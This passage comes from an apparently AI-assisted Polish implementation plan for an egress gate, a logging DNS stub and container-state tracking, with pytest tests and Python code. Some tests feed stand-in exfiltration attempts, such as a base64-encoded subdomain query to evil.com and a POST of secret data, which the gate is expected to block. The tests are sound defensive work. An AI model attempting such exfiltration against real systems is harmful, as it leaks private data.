from poi.gate import EgressGate
from poi.policy import parse
from poi.wal import WalReader, WalWriter

from helpers import POLICY

SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"
HOST, PATH = "api.example.com", "/v1/score"


@pytest.fixture
def env(tmp_path):
    fp = FingerprintSet(b"k" * 32)
    fp.add(SECRET, "r1")
    wal = WalWriter(tmp_path / "wal", tmp_path / "evidence")
    gate = EgressGate(parse(POLICY), wal, fp, clock=lambda: "2026-10-13T18:00:00Z")
    return gate, tmp_path


def _entries(tmp_path):
    return WalReader(tmp_path / "wal").read_new()


def test_allowed_request_is_normalised_and_logged(env):
    gate, tmp = env
    r = gate.on_request(HOST, "POST", PATH, [("User-Agent", "covert-123")], b'{"model": "small", "count": 1}')
    assert (r.verdict, r.seq) == ("allow", 1)
    assert r.body == b'{"count":1,"model":"small"}'
    assert r.headers == [("content-type", "application/json"), ("authorization", "Bearer test-token")]
    f = c.decode(_entries(tmp)[0].element)
    assert f[8] == "allow"
    assert evidence.get(tmp / "evidence", f[7]) == r.body
    assert f[6] == c.headers_digest(r.headers)


def test_blocked_request_keeps_original_as_evidence(env):
    gate, tmp = env
    r = gate.on_request(HOST, "POST", PATH, [], b'{"model":"small","count":1,"x":"leak"}')
    assert (r.verdict, r.reason, r.body) == ("block", "schema", b"")
    f = c.decode(_entries(tmp)[0].element)
    assert evidence.get(tmp / "evidence", f[7]) == b'{"model":"small","count":1,"x":"leak"}'


def test_connect_to_other_host_blocked_and_logged(env):
    gate, tmp = env
    assert gate.on_connect(HOST).verdict == "allow"
    assert gate.on_connect("evil.com").verdict == "block"
    assert [c.decode(e.element)[3] for e in _entries(tmp)] == ["CONNECT"]


def test_fingerprint_hit_blocks_even_if_schema_allows(env):
    gate, _ = env
    gate.policy = parse(POLICY.replace(b"required: [model, count]", b"required: [model, count]\n      maxProperties: 3")
                        .replace(b"count: {type: integer, minimum: 0, maximum: 255}",
                                 b"count: {type: integer, minimum: 0, maximum: 255}\n        note: {type: string, maxLength: 200}"))
    body = b'{"model":"small","count":1,"note":"' + SECRET + b'"}'
    r = gate.on_request(HOST, "POST", PATH, [], body)
    assert (r.verdict, r.reason) == ("block", "fingerprint")


def test_rate_limit(tmp_path):
    pol = parse(POLICY.replace(b"path: /v1/score", b"path: /v1/score\n    max_requests_per_minute: 2"))
    now = [0.0]
    gate = EgressGate(pol, WalWriter(tmp_path / "wal", tmp_path / "ev"), monotonic=lambda: now[0])
    body = b'{"model":"small","count":1}'
    assert [gate.on_request(HOST, "POST", PATH, [], body).verdict for _ in range(3)] == ["allow", "allow", "block"]
    now[0] = 61.0
    assert gate.on_request(HOST, "POST", PATH, [], body).verdict == "allow"


def test_wal_failure_fails_closed(env, monkeypatch):
    gate, _ = env

    def boom(*a, **k):
        raise OSError("disk full")
    monkeypatch.setattr(gate.wal, "record_egress", boom)
    r = gate.on_request(HOST, "POST", PATH, [], b'{"model":"small","count":1}')
    assert (r.verdict, r.reason) == ("block", "wal-failure")


def test_response_logged_as_ingress(env):
    gate, tmp = env
    r = gate.on_request(HOST, "POST", PATH, [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":1}')
    e = _entries(tmp)[-1]
    assert (e.kind, e.seq) == ("ingress", 1)
```

Utwórz `tests/test_dnsstub.py`:

```python
import socket

from dnslib import DNSRecord, RCODE

from poi import canonical as c
from poi.dnsstub import start_dns
from poi.wal import WalReader, WalWriter


def _free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def test_dns_stub_logs_and_answers(tmp_path):
    wal = WalWriter(tmp_path / "wal", tmp_path / "ev")
    port = _free_port()
    srv = start_dns(wal, {"api.example.com"}, "10.0.0.5", address="127.0.0.1", port=port)
    try:
        ok = DNSRecord.parse(DNSRecord.question("api.example.com").send("127.0.0.1", port, timeout=2))
        bad = DNSRecord.parse(DNSRecord.question("c2VjcmV0.evil.com").send("127.0.0.1", port, timeout=2))
    finally:
        srv.stop()
    assert str(ok.rr[0].rdata) == "10.0.0.5"
    assert bad.header.rcode == RCODE.NXDOMAIN
    fields = [c.decode(e.element) for e in WalReader(tmp_path / "wal").read_new()]
    assert [(f[0], f[1], f[3], f[5]) for f in fields] == [
        ("dns", "1", "api.example.com", "allow"), ("dns", "2", "c2VjcmV0.evil.com", "block")]
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_gate.py tests/test_dnsstub.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.gate'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/gate.py`:

```python
"""Egress decision logic, independent of mitmproxy so it can be unit-tested."""
from __future__ import annotations

import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable

from poi.fingerprint import FingerprintSet
from poi.policy import Policy
from poi.wal import WalWriter


def utcnow() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


@dataclass
class GateResult:
    verdict: str
    reason: str
    seq: int | None = None
    body: bytes = b""
    headers: list[tuple[str, str]] = field(default_factory=list)


class EgressGate:
    def __init__(self, policy: Policy, wal: WalWriter, fingerprints: FingerprintSet | None = None,
                 clock: Callable[[], str] = utcnow, monotonic: Callable[[], float] = time.monotonic) -> None:
        self.policy = policy
        self.wal = wal
        self.fingerprints = fingerprints
        self.clock = clock
        self.monotonic = monotonic
        self._window: dict[tuple[str, str, str], deque[float]] = defaultdict(deque)

    def _rate_ok(self, key: tuple[str, str, str], limit: int | None) -> bool:
        if limit is None:
            return True
        now = self.monotonic()
        q = self._window[key]
        while q and now - q[0] >= 60:
            q.popleft()
        if len(q) >= limit:
            return False
        q.append(now)
        return True

    def _record(self, method, host, path, headers, body, verdict, reason) -> GateResult:
        try:
            seq = self.wal.record_egress(self.clock(), method, host, path, headers, body, verdict, reason)
        except OSError:
            return GateResult("block", "wal-failure")  # fail closed: nothing leaves unlogged
        return GateResult(verdict, reason, seq, body if verdict == "allow" else b"", headers)

    def on_connect(self, host: str) -> GateResult:
        if host in self.policy.hosts:
            return GateResult("allow", "")
        return self._record("CONNECT", host, "", [], b"", "block", "host-not-allowed")

    def on_request(self, host: str, method: str, path: str,
                   headers: list[tuple[str, str]], body: bytes) -> GateResult:
        d = self.policy.decide(host, method, path, body)
        if d.verdict == "allow" and self.fingerprints is not None and self.fingerprints.scan(body):
            d.verdict, d.reason = "block", "fingerprint"
        if d.verdict == "allow" and not self._rate_ok((host, method, path), d.endpoint.max_requests_per_minute):
            d.verdict, d.reason = "block", "rate-limit"
        if d.verdict == "block":
            return self._record(method, host, path, headers, body, "block", d.reason)
        fwd = [("content-type", "application/json")] if d.body else []
        fwd += sorted(self.policy.forward_headers.items())
        return self._record(method, host, path, fwd, d.body, "allow", "")

    def on_response(self, seq: int, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
        self.wal.record_ingress(seq, status, headers, body)
```

Utwórz `src/poi/dnsstub.py`:

```python
"""DNS stub for the internal network: logs every query as an egress event, answers only allow-listed hosts."""
from __future__ import annotations

from typing import Callable

from dnslib import QTYPE, RCODE, RR, A
from dnslib.server import BaseResolver, DNSLogger, DNSServer

from poi.gate import utcnow
from poi.wal import WalWriter


class PoiResolver(BaseResolver):
    def __init__(self, wal: WalWriter, hosts: set[str], answer_ip: str,
                 clock: Callable[[], str] = utcnow) -> None:
        self.wal, self.hosts, self.answer_ip, self.clock = wal, hosts, answer_ip, clock

    def resolve(self, request, handler):
        qname = request.q.qname
        name = str(qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]
        allowed = name in self.hosts and qtype == "A"
        reply = request.reply()
        try:
            self.wal.record_dns(self.clock(), name, qtype, "allow" if allowed else "block")
        except OSError:
            reply.header.rcode = RCODE.SERVFAIL
            return reply
        if allowed:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.answer_ip), ttl=60))
        else:
            reply.header.rcode = RCODE.NXDOMAIN
        return reply


def start_dns(wal: WalWriter, hosts: set[str], answer_ip: str,
              address: str = "0.0.0.0", port: int = 53) -> DNSServer:
    server = DNSServer(PoiResolver(wal, hosts, answer_ip), address=address, port=port,
                       logger=DNSLogger(logf=lambda s: None))
    server.start_thread()
    return server
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_gate.py tests/test_dnsstub.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/dnsstub.py src/poi/gate.py tests/test_dnsstub.py tests/test_gate.py
git commit -m "feat: egress gate and logging DNS stub

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 9: Śledzenie stanu kontenera

Elementy `file` i `config` z `docker export` / `docker diff` + archiwum ścieżek; wolumen wyjściowy z hosta; delty jako `DeltaOp` (§12 p.1).

**Files:**
- Create: `src/poi/state.py`
- Modify: `tests/helpers.py` (dopisz `FakeFS`)
- Test: `tests/test_state.py`

**Interfaces:**
- Consumes: `poi.canonical`, `poi.ledger.DeltaOp`
- Produces: protokół `ContainerFS` (`export, export_image, diff, stat, archive, inspect, network_internal`), `CONFIG_KEY`, `scan_tar(chunks, excludes)`, `element_from_archive(path, chunks)`, `scan_host_dir(host_dir, target)`, `config_doc(inspect, network_internal)`, `config_bytes(doc)`, `StateTracker(fs, output=None, retries=3)` z `index`, `image_index`, `last_config: bytes`, `load_image()`, `target(full=False)`, `update(full=False)->list[DeltaOp]`, `restore_index(elements)`; `DockerContainerFS(client, container)`.
- Produces (testy): `FakeFS(image, mounts=())` z `write`, `delete`, `networks`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Dopisz na końcu `tests/helpers.py`:

```python


class FakeFS:
    """In-memory ContainerFS. Files: {path: bytes | None(dir) | ("link", target)}."""

    def __init__(self, image: dict, mounts=()):
        self.image = dict(image)
        self.files = dict(image)
        self.mounts = list(mounts)
        self.networks = {"poi-int": True}
        self.mtime = {}

    def write(self, path, data):
        self.files[path] = data
        self.mtime[path] = self.mtime.get(path, 0) + 1

    def delete(self, path):
        for k in [k for k in self.files if k == path or k.startswith(path + "/")]:
            del self.files[k]

    def _tar(self, files):
        import io
        import tarfile
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            for p in sorted(files):
                v = files[p]
                ti = tarfile.TarInfo(p.lstrip("/"))
                ti.mode = 0o644
                if v is None:
                    ti.type, ti.mode = tarfile.DIRTYPE, 0o755
                    t.addfile(ti)
                elif isinstance(v, tuple):
                    ti.type, ti.linkname = tarfile.SYMTYPE, v[1]
                    t.addfile(ti)
                else:
                    ti.size = len(v)
                    t.addfile(ti, io.BytesIO(v))
        data = buf.getvalue()
        return [data[i:i + 1000] for i in range(0, len(data), 1000)]

    def export(self):
        return self._tar(self.files)

    def export_image(self):
        return self._tar(self.image)

    def diff(self):
        out = []
        for p in sorted(self.image.keys() - self.files.keys()):
            out.append({"Path": p, "Kind": 2})
        for p in sorted(self.files):
            if p not in self.image:
                out.append({"Path": p, "Kind": 1})
            elif self.files[p] != self.image[p]:
                out.append({"Path": p, "Kind": 0})
        return out

    def stat(self, path):
        if path not in self.files:
            return None
        v = self.files[path]
        return {"name": path, "size": len(v) if isinstance(v, bytes) else 0, "mtime": self.mtime.get(path, 0)}

    def archive(self, path):
        name = path.rsplit("/", 1)[-1]
        return self._tar({name: self.files[path]})

    def inspect(self):
        return {"Image": "sha256:img", "Config": {"User": ""},
                "HostConfig": {"Privileged": False, "NetworkMode": "poi-int", "Dns": ["10.0.0.2"]},
                "NetworkSettings": {"Networks": {n: {} for n in self.networks}},
                "Mounts": self.mounts}

    def network_internal(self, name):
        return self.networks[name]
```

Utwórz `tests/test_state.py`:

```python
from poi.lthash import LtHash
from poi.state import CONFIG_KEY, StateTracker, config_doc, scan_tar

from helpers import FakeFS

IMAGE = {"/etc": None, "/etc/os": b"alpine", "/etc/motd": b"hi", "/bin": None,
         "/bin/sh": b"ELF", "/bin/ash": ("link", "/bin/sh"), "/srv": None}


def _apply(h: LtHash, ops):
    for op in ops:
        (h.add if op.op == "add" else h.sub)(op.element)
    return h


def _full_hash(fs, tr):
    return LtHash.of(tr.target(full=True).values())


def _genesis(fs, output=None):
    tr = StateTracker(fs, output)
    tr.load_image()
    h = _apply(LtHash(), tr.update())
    return tr, h


def test_genesis_equals_full_export():
    fs = FakeFS(IMAGE)
    tr, h = _genesis(fs)
    assert h == _full_hash(fs, StateTracker(fs))
    assert CONFIG_KEY in tr.index


def test_incremental_matches_full_scan_after_changes():
    fs = FakeFS(IMAGE)
    tr, h = _genesis(fs)
    fs.write("/etc/motd", b"changed")
    fs.write("/tmp", None)
    fs.write("/tmp/x", b"new")
    fs.delete("/bin")
    h = _apply(h, tr.update())
    assert h == _full_hash(fs, StateTracker(fs))
    fs.delete("/tmp/x")          # created then removed: disappears from diff
    h = _apply(h, tr.update())
    assert h == _full_hash(fs, StateTracker(fs))


def test_no_change_no_ops():
    fs = FakeFS(IMAGE)
    tr, _ = _genesis(fs)
    assert tr.update() == []


def test_mounts_excluded_and_output_volume_scanned(tmp_path):
    fs = FakeFS({**IMAGE, "/srv/out": None, "/srv/out/placeholder": b""},
                mounts=[{"Destination": "/srv/out", "RW": True, "Type": "bind"}])
    tr, h = _genesis(fs, (tmp_path, "/srv/out"))
    assert "/srv/out/placeholder" not in tr.index
    (tmp_path / "result.json").write_bytes(b"{}")
    ops = tr.update()
    assert [o.op for o in ops] == ["add"]
    assert "/srv/out/result.json" in tr.index


def test_config_change_produces_delta():
    fs = FakeFS(IMAGE)
    tr, _ = _genesis(fs)
    fs.networks["bridge"] = False
    ops = tr.update()
    assert [o.op for o in ops] == ["sub", "add"]
    assert ops[1].element.startswith(b"config\0")


def test_restore_index_then_full_update():
    fs = FakeFS(IMAGE)
    tr, h = _genesis(fs)
    fs.write("/etc/os", b"tampered")
    tr2 = StateTracker(fs)
    tr2.restore_index(tr.index.values())
    tr2.load_image()
    h = _apply(h, tr2.update(full=True))
    assert h == _full_hash(fs, StateTracker(fs))


def test_config_doc_shape():
    fs = FakeFS(IMAGE, mounts=[{"Destination": "/srv/out", "RW": True, "Type": "bind"}])
    d = config_doc(fs.inspect(), fs.network_internal)
    assert d["networks"] == [{"name": "poi-int", "internal": True}]
    assert d["mounts"] == [{"destination": "/srv/out", "rw": True, "type": "bind"}]


def test_scan_tar_symlink_and_dirs():
    idx = scan_tar(FakeFS(IMAGE).export())
    assert idx["/bin/ash"].split(b"\0")[2] == b"symlink"
    assert idx["/etc"].split(b"\0")[2] == b"dir"
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_state.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.state'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/state.py`:

```python
"""Container state as a set of `file` elements plus one `config` element.

Genesis and full scans read `docker export` (a tar of the merged filesystem); ticks
re-read only the paths reported by `docker diff`, which is the overlay upper layer.
Mount destinations are excluded from file scanning: mounts are attested by the
config element, and the declared output volume is scanned from its host directory.
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import stat as st
import tarfile
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Iterator, Protocol

from poi import canonical as c
from poi.ledger import DeltaOp

CONFIG_KEY = "\0config"
KIND_DELETED = 2
_CHUNK = 1 << 20


class ContainerFS(Protocol):
    def export(self) -> Iterable[bytes]: ...
    def export_image(self) -> Iterable[bytes]: ...
    def diff(self) -> list[dict]: ...
    def stat(self, path: str) -> dict | None: ...
    def archive(self, path: str) -> Iterable[bytes]: ...
    def inspect(self) -> dict: ...
    def network_internal(self, name: str) -> bool: ...


class _ChunkReader(io.RawIOBase):
    """File-like view over an iterator of byte chunks (for streaming tarfile)."""

    def __init__(self, chunks: Iterable[bytes]) -> None:
        self._it: Iterator[bytes] = iter(chunks)
        self._buf = b""

    def readable(self) -> bool:
        return True

    def readinto(self, b) -> int:
        while not self._buf:
            try:
                self._buf = next(self._it)
            except StopIteration:
                return 0
        n = min(len(b), len(self._buf))
        b[:n] = self._buf[:n]
        self._buf = self._buf[n:]
        return n


def _digest_stream(f) -> str:
    h = hashlib.blake2b(digest_size=32)
    while chunk := f.read(_CHUNK):
        h.update(chunk)
    return h.hexdigest()


def _member_element(path: str, m: tarfile.TarInfo, tar: tarfile.TarFile,
                    digests: dict[str, str]) -> bytes:
    if m.isreg():
        d = _digest_stream(tar.extractfile(m))
        digests[path] = d
        return c.file_element(path, "file", m.mode, m.uid, m.gid, d)
    if m.islnk():  # hard link: same bytes as its (earlier) target, as `docker cp` would show
        target = "/" + m.linkname.lstrip("./")
        return c.file_element(path, "file", m.mode, m.uid, m.gid, digests.get(target, ""))
    if m.issym():
        return c.file_element(path, "symlink", m.mode, m.uid, m.gid, m.linkname)
    if m.isdir():
        return c.file_element(path, "dir", m.mode, m.uid, m.gid, "")
    return c.file_element(path, "special", m.mode, m.uid, m.gid, "")


def _norm(name: str) -> str:
    name = name.lstrip(".").strip("/")
    return "/" + name if name else ""


def _excluded(path: str, excludes: tuple[str, ...]) -> bool:
    return any(path == e or path.startswith(e + "/") for e in excludes)


def scan_tar(chunks: Iterable[bytes], excludes: tuple[str, ...] = ()) -> dict[str, bytes]:
    """Full filesystem tar → {path: element}."""
    out: dict[str, bytes] = {}
    digests: dict[str, str] = {}
    with tarfile.open(fileobj=io.BufferedReader(_ChunkReader(chunks)), mode="r|") as tar:
        for m in tar:
            path = _norm(m.name)
            if path and not _excluded(path, excludes):
                out[path] = _member_element(path, m, tar, digests)
    return out


def element_from_archive(path: str, chunks: Iterable[bytes]) -> bytes | None:
    """`docker cp`-style archive of one path → element of that path (first tar member)."""
    with tarfile.open(fileobj=io.BufferedReader(_ChunkReader(chunks)), mode="r|") as tar:
        for m in tar:
            return _member_element(path, m, tar, {})
    return None


def scan_host_dir(host_dir: Path, target: str) -> dict[str, bytes]:
    """Scan the output volume on the host; elements use container paths under `target`."""
    out: dict[str, bytes] = {}
    host_dir = Path(host_dir)
    for root, dirs, files in os.walk(host_dir):
        for name in sorted(dirs) + sorted(files):
            p = Path(root) / name
            s = os.lstat(p)
            cpath = target.rstrip("/") + "/" + str(p.relative_to(host_dir))
            if st.S_ISREG(s.st_mode):
                with open(p, "rb") as f:
                    content, ftype = _digest_stream(f), "file"
            elif st.S_ISLNK(s.st_mode):
                content, ftype = os.readlink(p), "symlink"
            elif st.S_ISDIR(s.st_mode):
                content, ftype = "", "dir"
            else:
                content, ftype = "", "special"
            out[cpath] = c.file_element(cpath, ftype, s.st_mode, s.st_uid, s.st_gid, content)
    return out


def config_doc(inspect: dict, network_internal) -> dict:
    """Security-relevant container configuration (spec §5.2 `config`)."""
    hc = inspect["HostConfig"]
    nets = inspect["NetworkSettings"]["Networks"] or {}
    return {
        "image": inspect["Image"],
        "user": inspect["Config"].get("User", ""),
        "privileged": bool(hc.get("Privileged")),
        "cap_add": sorted(hc.get("CapAdd") or []),
        "network_mode": hc.get("NetworkMode", ""),
        "networks": [{"name": n, "internal": network_internal(n)} for n in sorted(nets)],
        "mounts": sorted(({"destination": m["Destination"], "rw": bool(m["RW"]), "type": m["Type"]}
                          for m in inspect.get("Mounts", [])), key=lambda m: m["destination"]),
        "dns": list(hc.get("Dns") or []),
        "pid_mode": hc.get("PidMode", ""),
        "ipc_mode": hc.get("IpcMode", ""),
        "devices": len(hc.get("Devices") or []),
    }


def config_bytes(doc: dict) -> bytes:
    return c.canonical_json(doc)


@dataclass
class _Cached:
    stat_key: str
    element: bytes


class StateTracker:
    def __init__(self, fs: ContainerFS, output: tuple[Path, str] | None = None,
                 retries: int = 3) -> None:
        self.fs = fs
        self.output = output
        self.retries = retries
        self.index: dict[str, bytes] = {}
        self.image_index: dict[str, bytes] = {}
        self._cache: dict[str, _Cached] = {}
        self.last_config: bytes = b""

    # -- helpers --------------------------------------------------------------
    def _excludes(self, inspect: dict) -> tuple[str, ...]:
        return tuple(sorted(m["Destination"] for m in inspect.get("Mounts", [])))

    def _config(self, inspect: dict) -> tuple[str, bytes]:
        raw = config_bytes(config_doc(inspect, self.fs.network_internal))
        self.last_config = raw
        return c.b2b256(raw), c.config_element(c.b2b256(raw))

    def _element(self, path: str) -> bytes | None:
        """Re-hash a changed path; stat before/after must agree (else retry, then defer)."""
        for _ in range(self.retries):
            before = self.fs.stat(path)
            if before is None:
                return None
            key = json.dumps(before, sort_keys=True)
            cached = self._cache.get(path)
            if cached and cached.stat_key == key:
                return cached.element
            el = element_from_archive(path, self.fs.archive(path))
            if el is not None and self.fs.stat(path) == before:
                self._cache[path] = _Cached(key, el)
                return el
        return self.index.get(path)  # unstable: keep last known value, retry next tick

    # -- public API -------------------------------------------------------------
    def load_image(self) -> None:
        self.image_index = scan_tar(self.fs.export_image(), self._excludes(self.fs.inspect()))

    def target(self, full: bool = False) -> dict[str, bytes]:
        inspect = self.fs.inspect()
        excludes = self._excludes(inspect)
        if full:
            t = scan_tar(self.fs.export(), excludes)
        else:
            t = dict(self.image_index)
            changes = [d for d in self.fs.diff() if not _excluded(d["Path"], excludes)]
            for d in changes:
                if d["Kind"] == KIND_DELETED:
                    p = d["Path"]
                    for k in [k for k in t if k == p or k.startswith(p + "/")]:
                        del t[k]
            for d in changes:
                if d["Kind"] != KIND_DELETED:
                    el = self._element(d["Path"])
                    if el is not None:
                        t[d["Path"]] = el
        if self.output is not None:
            t.update(scan_host_dir(*self.output))
        _, cfg = self._config(inspect)
        t[CONFIG_KEY] = cfg
        return t

    def update(self, full: bool = False) -> list[DeltaOp]:
        """Compute target state and return the ops that move `index` to it."""
        target = self.target(full)
        ops: list[DeltaOp] = []
        for k in sorted(self.index.keys() - target.keys()):
            ops.append(DeltaOp("sub", "state", self.index[k]))
        for k in sorted(target.keys()):
            old = self.index.get(k)
            if old != target[k]:
                if old is not None:
                    ops.append(DeltaOp("sub", "state", old))
                ops.append(DeltaOp("add", "state", target[k]))
        self.index = target
        return ops

    def restore_index(self, elements: Iterable[bytes]) -> None:
        """Rebuild the path index from replayed ledger elements (daemon restart)."""
        self.index = {}
        for e in elements:
            f = c.decode(e)
            self.index[CONFIG_KEY if f[0] == "config" else f[1]] = e


class DockerContainerFS:
    """ContainerFS backed by the Docker Engine API (no root needed, only docker group)."""

    def __init__(self, client, container) -> None:
        self.client = client
        self.container = container

    def export(self) -> Iterable[bytes]:
        return self.container.export()

    def export_image(self) -> Iterable[bytes]:
        tmp = self.client.containers.create(self.container.attrs["Image"], command=["true"])
        try:
            yield from tmp.export()
        finally:
            tmp.remove(force=True)

    def diff(self) -> list[dict]:
        return self.container.diff() or []

    def stat(self, path: str) -> dict | None:
        api = self.client.api
        r = api.head(api._url("/containers/{0}/archive", self.container.id), params={"path": path})
        if r.status_code != 200:
            return None
        return json.loads(base64.b64decode(r.headers["X-Docker-Container-Path-Stat"]))

    def archive(self, path: str) -> Iterable[bytes]:
        stream, _ = self.container.get_archive(path)
        return stream

    def inspect(self) -> dict:
        self.container.reload()
        return self.container.attrs

    def network_internal(self, name: str) -> bool:
        if name in ("bridge", "host", "none"):
            return name == "none"
        return bool(self.client.networks.get(name).attrs.get("Internal"))
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_state.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/state.py tests/helpers.py tests/test_state.py
git commit -m "feat: container state tracking via docker export/diff

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 10: Silnik demona i publisher

Tick: delty stanu + zdarzenia WAL → podpisany checkpoint → `Publisher`; reakcja na naruszenia; wznowienie po restarcie (§8).

**Files:**
- Create: `src/poi/publish.py`
- Create: `src/poi/engine.py`
- Modify: `tests/helpers.py` (dopisz `make_engine`)
- Test: `tests/test_engine.py`

**Interfaces:**
- Consumes: `Ledger`, `StateTracker`, `WalReader`, `Policy`, `config_violations`, `evidence.put`, `utcnow`
- Produces: `Publisher` (protokół `publish(cp)`), `LocalPublisher(run_dir)` → `heads.jsonl`; `Engine(ledger, tracker, wal, publisher, policy, container, *, clock=utcnow, on_violation=..., full_scan_every=60)` z `genesis()`, `tick()`, `resume()` (każda zwraca checkpoint), `violations`.
- Produces (testy): `ENGINE_IMAGE`, `ENGINE_MOUNTS`, `clock_from_zero()`, `make_engine(tmp_path, key, fs, violations=None)->(Engine, EgressGate)`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Dopisz na końcu `tests/helpers.py`:

```python


ENGINE_IMAGE = {"/etc": None, "/etc/os": b"alpine", "/srv": None, "/srv/out": None}
ENGINE_MOUNTS = [{"Destination": "/srv/out", "RW": True, "Type": "bind"}]


def clock_from_zero():
    n = [0]

    def f():
        n[0] += 1
        return f"2026-10-13T18:00:{n[0]:02d}Z"
    return f


def make_engine(tmp_path, key, fs, violations=None):
    """Engine + EgressGate over a FakeFS, writing a run into tmp_path/run."""
    from poi.engine import Engine
    from poi.gate import EgressGate
    from poi.policy import parse
    from poi.publish import LocalPublisher
    from poi.state import StateTracker
    from poi.wal import WalReader, WalWriter

    pol = parse(POLICY)
    out = tmp_path / "out"
    out.mkdir(exist_ok=True)
    eng = Engine(Ledger(tmp_path / "run", key), StateTracker(fs, (out, "/srv/out")),
                 WalReader(tmp_path / "run" / "proxy-wal"), LocalPublisher(tmp_path / "run"), pol,
                 {"id": "abc", "image": "sha256:img"}, clock=clock_from_zero(),
                 on_violation=(violations.append if violations is not None else lambda v: None),
                 full_scan_every=3)
    gate = EgressGate(pol, WalWriter(tmp_path / "run" / "proxy-wal", tmp_path / "run" / "evidence"))
    return eng, gate
```

Utwórz `tests/test_engine.py`:

```python
from poi.ledger import pubkey_hex
from poi.verify import verify_chain

from helpers import ENGINE_IMAGE as IMAGE, ENGINE_MOUNTS as MOUNTS, FakeFS, make_engine as _engine

def test_genesis_tick_and_verify(tmp_path, key):
    fs = FakeFS(IMAGE, MOUNTS)
    eng, gate = _engine(tmp_path, key, fs)
    eng.genesis()
    fs.write("/tmp", None)
    fs.write("/tmp/x", b"1")
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_response(r.seq, 200, [], b"{}")
    gate.on_request("evil.com", "POST", "/", [], b"secret")
    (tmp_path / "out" / "result.json").write_bytes(b"{}")
    for _ in range(4):  # includes a periodic full scan (tick 3)
        eng.tick()
    res = verify_chain(tmp_path / "run", pubkey_hex(key))
    assert len(res.checkpoints) == 5
    assert [e.seq for e in res.egress] == [1, 2]
    assert len(res.ingress) == 1
    assert (tmp_path / "run" / "heads.jsonl").read_text().count("\n") == 5


def test_violation_callback(tmp_path, key):
    fs = FakeFS(IMAGE, MOUNTS)
    seen = []
    eng, _ = _engine(tmp_path, key, fs, seen)
    eng.genesis()
    assert seen == []
    fs.networks["bridge"] = False
    eng.tick()
    assert seen and "internal network" in seen[0][0]


def test_resume_after_restart(tmp_path, key):
    fs = FakeFS(IMAGE, MOUNTS)
    eng, gate = _engine(tmp_path, key, fs)
    eng.genesis()
    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    eng.tick()
    gate.on_response(r.seq, 200, [], b"{}")            # arrives while daemon is down
    fs.write("/etc/os", b"changed while down")
    eng2, _ = _engine(tmp_path, key, fs)
    cp = eng2.resume()
    assert cp["restart"] is True
    eng2.tick()
    res = verify_chain(tmp_path / "run", pubkey_hex(key))
    assert [e.seq for e in res.egress] == [1] and len(res.ingress) == 1
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_engine.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.engine'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/publish.py`:

```python
"""Where checkpoints go after they are written. v1: local; later Rekor / HTTP."""
from __future__ import annotations

from pathlib import Path
from typing import Protocol

from poi.canonical import canonical_json, checkpoint_digest


class Publisher(Protocol):
    def publish(self, checkpoint: dict) -> None: ...


class LocalPublisher:
    """Appends {seq, t, digest} of every checkpoint to `heads.jsonl` (the hand-off point for exporters)."""

    def __init__(self, run_dir: Path) -> None:
        self.path = Path(run_dir) / "heads.jsonl"

    def publish(self, checkpoint: dict) -> None:
        line = canonical_json({"seq": checkpoint["seq"], "t": checkpoint["t"],
                               "digest": checkpoint_digest(checkpoint)})
        with open(self.path, "ab") as f:
            f.write(line + b"\n")
```

Utwórz `src/poi/engine.py`:

```python
"""Daemon core: turns state changes and proxy WAL events into signed checkpoints."""
from __future__ import annotations

import json
from typing import Callable

from poi import canonical as c
from poi import evidence
from poi.gate import utcnow
from poi.ledger import DeltaOp, Ledger
from poi.lthash import LtHash
from poi.policy import Policy, config_violations
from poi.publish import Publisher
from poi.state import StateTracker
from poi.wal import WalReader


class Engine:
    def __init__(self, ledger: Ledger, tracker: StateTracker, wal: WalReader, publisher: Publisher,
                 policy: Policy, container: dict, *, clock: Callable[[], str] = utcnow,
                 on_violation: Callable[[list[str]], None] = lambda v: None,
                 full_scan_every: int = 60) -> None:
        self.ledger, self.tracker, self.wal, self.publisher = ledger, tracker, wal, publisher
        self.policy, self.container, self.clock = policy, container, clock
        self.on_violation = on_violation
        self.full_scan_every = full_scan_every
        self.accs = {a: LtHash() for a in ("state", "egress", "ingress")}
        self.counts = {"egress": 0, "ingress": 0}
        self.egress_seq = 0
        self.ingress_seen: set[int] = set()
        self.ticks = 0
        self.violations: list[str] = []

